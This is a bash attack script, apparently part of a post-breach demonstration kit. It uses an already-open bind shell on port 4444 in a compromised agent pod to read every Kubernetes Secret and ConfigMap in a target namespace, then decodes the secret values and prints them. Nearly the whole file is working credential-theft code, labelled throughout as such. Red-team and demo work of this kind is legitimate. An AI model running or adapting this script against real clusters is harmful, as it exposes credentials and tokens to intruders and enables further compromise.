#!/usr/bin/env bash
# Credential theft: read Kubernetes Secrets and ConfigMaps from target namespaces.
# Decodes base64 secret values and prints them.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: attack-steal-secrets.sh [NAMESPACE]"
  echo "  Reads Kubernetes Secrets and ConfigMaps from the target namespace."
  echo "  Decodes and prints secret values. Default namespace: target-apps."
  echo ""
  echo "  Requires: bind shell open (run trigger.sh + wait-shell.sh first)"
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

TARGET_NS="${1:-target-apps}"

banner "Post-Breach: Steal Secrets ($TARGET_NS)"

PYTHON_CODE="${K8S_API_PREAMBLE}

target_ns = '${TARGET_NS}'

print('=' * 60)
print(f'  SECRETS in namespace: {target_ns}')
print('=' * 60)

secrets = k8s_get(f'/api/v1/namespaces/{target_ns}/secrets')
if 'error' in secrets:
    print(f'  Error reading secrets: {secrets}')
else:
    items = secrets.get('items', [])
    print(f'  Found {len(items)} secrets')
    for s in items:
        name = s['metadata']['name']
        stype = s.get('type', 'Opaque')
        print(f'  --- {name} (type: {stype}) ---')
        data = s.get('data', {})
        for k, v in data.items():
            try:
                decoded = base64.b64decode(v).decode('utf-8', errors='replace')
                if len(decoded) > 200:
                    decoded = decoded[:200] + '...'
                print(f'    {k} = {decoded}')
            except Exception:
                print(f'    {k} = <binary, {len(v)} chars b64>')

print()
print('=' * 60)
print(f'  CONFIGMAPS in namespace: {target_ns}')
print('=' * 60)

cms = k8s_get(f'/api/v1/namespaces/{target_ns}/configmaps')
if 'error' in cms:
    print(f'  Error reading configmaps: {cms}')
else:
    items = cms.get('items', [])
    print(f'  Found {len(items)} configmaps')
    for cm in items:
        name = cm['metadata']['name']
        data = cm.get('data', {})
        if not data:
            continue
        print(f'  --- {name} ---')
        for k, v in data.items():
            display = v[:200] + '...' if len(v) > 200 else v
            print(f'    {k} = {display}')

print()
print('Credential theft complete.')
"

echo "  Piping secret-stealing script to agent pod..."
echo ""
run_on_agent "$PYTHON_CODE"
echo ""
echo "Secret extraction complete."
